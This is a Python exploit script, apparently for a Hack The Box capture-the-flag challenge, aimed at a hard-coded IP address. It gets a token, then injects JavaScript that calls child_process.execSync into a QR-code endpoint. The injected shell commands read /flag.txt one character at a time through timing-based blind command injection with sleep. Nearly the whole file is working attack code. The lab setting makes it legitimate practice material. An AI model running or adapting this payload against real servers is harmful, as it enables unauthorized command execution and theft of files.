#!/usr/bin/python3

import requests
import json
import time

server="83.136.253.251"
port=46934

url=f"http://{server}:{port}"
payload = 'cat /flag.txt | head -c 4 | { read c; if [ $c = "HTB{" ]; then sleep 5; fi; }'

auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"

headers = {"Content-Type": "application/json"}
data = {"email": "test@hackthebox.com"}

response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']
print(token)

flag_length = 32  # Długość flagi
flag = ""

for i in range(flag_length):
    found_char = False
    for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~":
        start_time = time.time()
        user_input = f'cat /flag.txt | head -c {i+1} | {{ read c; if [ $c = "{flag}{char}" ]; then sleep 2; fi; }}'
        payload={ "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"}

        #print(payload)

        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
        response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
        end_time = time.time()

        if end_time - start_time >= 2:
            flag += char
            found_char = True
            print(f"Found character: {flag}")
            break
    if not found_char:
        print("Character not found")
        break
print(f"Flag: {flag}")

